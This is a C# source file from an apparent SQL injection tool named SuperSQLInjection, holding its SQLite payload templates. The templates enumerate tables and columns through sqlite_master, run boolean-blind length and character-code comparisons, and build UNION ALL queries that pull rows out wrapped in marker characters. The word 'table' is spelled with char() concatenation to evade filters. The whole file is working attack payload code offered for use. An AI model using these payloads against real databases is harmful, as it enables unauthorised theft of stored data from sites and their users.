using System;
using System.Collections.Generic;
using System.Text;
using tools;

namespace SuperSQLInjection.payload
{
    class SQLite
    {
        //加载对应配置(需要读取的环境变量)
        public static String path = "config/vers/sqlite.txt";
        public static List<String> vers = FileTool.readFileToList(path);

        //表数量
        public static String tables_count = "(select count(1) from sqlite_master where type=char(116)||char(97)||char(98)||char(108)||char(101))";
        
        //获取表名称
        public static String table_value = "(select tbl_name from sqlite_master where type=char(116)||char(97)||char(98)||char(108)||char(101) limit 1 offset {index})";

        //获取列名称
        public static String column_value = "(select substr(sql,instr(sql,char(40))) from sqlite_master where type=char(116)||char(97)||char(98)||char(108)||char(101) and tbl_name='{table}')";

        //获取表数量bool
        public static String bool_tables_count = " " + tables_count + ">{len}";

        
        //bool方式字符长度判断
        public static String bool_length = " length({data})>{len}";

        public static String check_li_value = " length({data})<{len}";


        //bool方式获取值
        public static String bool_value = " unicode(substr({data},{index},1))>{len}";

        //bool方式获取值
        public static String bool_noUnicode_value = "{data}>{len}";

        public static String unicode_value = " unicode(substr({data},{index},1))";

        //获取行数据
        public static String data_value = "(select {data} from {table} limit 1 offset {index})";

        //union获取数据条数
        public static String data_count = "(select count(1) from {table})";

        public static String bool_datas_count = " " + data_count + ">={len}";

        //union获取值
        public static String union_value = " 1=2 union all select {data}";
      
        public static String getUnionDataValue(int columnsLen, int showIndex, String Fill, List<String> columns, String table, String index)
        {
            StringBuilder sb = new StringBuilder();
            String data = "char(94)||char(94)||char(33)||" + unionColumns(columns, "||char(36)||char(36)||char(36)||") + "||char(33)||char(94)||char(94)";
            for (int i = 1; i <= columnsLen; i++)
            {
                if (i == showIndex)
                {
                    sb.Append(data_value.Replace("{data}", data).Replace("{allcolumns}", unionColumns(columns, ",")).Replace("{table}", table).Replace("{index}", index));
                    sb.Append(",");
                }
                else
                {
                    sb.Append(Fill + ",");
                }
            }
            sb.Remove(sb.Length - 1, 1);
            return union_value.Replace("{data}", sb.ToString());
        }

        public static String unionColumns(List<String> columns, String unionStr)
        {
            StringBuilder sb = new StringBuilder();
            foreach (String column in columns)
            {

                sb.Append("coalesce("+column+",char(32))"+unionStr);
            }
            sb.Remove(sb.Length - unionStr.Length, unionStr.Length);
            return sb.ToString();
        }

        public static String getUnionDataValue(int columnsLen, int showIndex, String Fill, String dataPayLoad)
        {
            StringBuilder sb = new StringBuilder();
            for (int i = 1; i <= columnsLen; i++)
            {
                if (i == showIndex)
                {
                    sb.Append("(char(94)||char(94)||char(33)||" + dataPayLoad + "||char(33)||char(94)||char(94)),");
                }
                else
                {
                    sb.Append(Fill + ",");
                }
            }
            sb.Remove(sb.Length - 1, 1);
            return union_value.Replace("{data}", sb.ToString());
        }
        public static String getBoolDataPayLoad(String column, List<String> columns, String dbName, String table, int index)
        {
            String data = data_value.Replace("{data}", column).Replace("{allcolumns}", unionColumns(columns, ",")).Replace("{orderby}", columns[0]);
            String payload = data.Replace("{dbname}", dbName).Replace("{table}", table).Replace("{data}", column).Replace("{index}", index.ToString());
            return payload;
        }
       
    }
}
